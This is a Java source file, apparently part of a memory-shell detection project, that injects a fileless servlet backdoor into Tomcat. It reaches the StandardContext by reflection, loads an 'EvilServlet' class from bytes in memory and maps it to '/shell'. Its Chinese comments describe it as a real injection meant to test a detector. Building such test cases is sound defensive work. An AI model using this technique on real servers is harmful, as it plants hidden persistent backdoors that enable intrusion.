package com.execguard.app.memshell;

import org.apache.catalina.Wrapper;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;

import javax.servlet.Servlet;
import javax.servlet.ServletContext;
import javax.servlet.http.HttpServletRequest;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

/**
 * 真实的 servlet 内存马注入。
 *
 * 和常见 servlet 马的注入方式一致：
 *   1. 通过 ServletContext -> ApplicationContext -> StandardContext 拿到 Tomcat 上下文
 *   2. 从 payloads/target/classes 读出 EvilServlet.class 字节
 *   3. 用自定义 ClassLoader 在内存里 defineClass（没有部署文件来源）
 *   4. createWrapper + setServlet(instance) + addChild + addServletMappingDecoded
 *
 * 第 3 步是关键：类不在应用 classpath / 部署目录里，所以检测器能看到
 * “没有部署文件来源的类”并拦截。
 */
public final class ServletShellInjector {
    private static final String SERVLET_NAME = "execServlet";
    private static final String SERVLET_PATH = "/shell";

    private ServletShellInjector() {
    }

    public static synchronized String inject(HttpServletRequest request) throws Exception {
        StandardContext context = standardContext(request.getServletContext());
        if (context.findChild(SERVLET_NAME) != null) {
            return SERVLET_PATH;
        }

        byte[] classBytes = Files.readAllBytes(payloadFile());
        MemoryClassLoader loader = new MemoryClassLoader(
                ServletShellInjector.class.getClassLoader());
        Class<?> servletClass = loader.define("evil.EvilServlet", classBytes);
        Servlet servlet = (Servlet) servletClass.getDeclaredConstructor().newInstance();

        Wrapper wrapper = context.createWrapper();
        wrapper.setName(SERVLET_NAME);
        wrapper.setServlet(servlet);
        wrapper.setServletClass(servletClass.getName());
        wrapper.setLoadOnStartup(1);
        context.addChild(wrapper);
        context.addServletMappingDecoded(SERVLET_PATH, SERVLET_NAME);

        return SERVLET_PATH;
    }

    private static StandardContext standardContext(ServletContext servletContext) throws Exception {
        Field field = servletContext.getClass().getDeclaredField("context");
        field.setAccessible(true);
        ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext);

        field = applicationContext.getClass().getDeclaredField("context");
        field.setAccessible(true);
        return (StandardContext) field.get(applicationContext);
    }

    private static Path payloadFile() {
        String payloadDir = System.getProperty("payload.dir");
        if (payloadDir == null || payloadDir.isEmpty()) {
            throw new IllegalStateException("missing -Dpayload.dir");
        }
        Path file = Paths.get(payloadDir, "evil", "EvilServlet.class");
        if (!Files.isReadable(file)) {
            throw new IllegalStateException("payload not found: " + file);
        }
        return file;
    }

    /**
     * 只用于把 payload 字节 define 到内存，父加载器是应用类加载器，
     * 这样 EvilServlet 才能看到 javax.servlet / Tomcat 的类。
     */
    private static final class MemoryClassLoader extends ClassLoader {
        MemoryClassLoader(ClassLoader parent) {
            super(parent);
        }

        Class<?> define(String name, byte[] bytes) {
            return defineClass(name, bytes, 0, bytes.length);
        }
    }
}
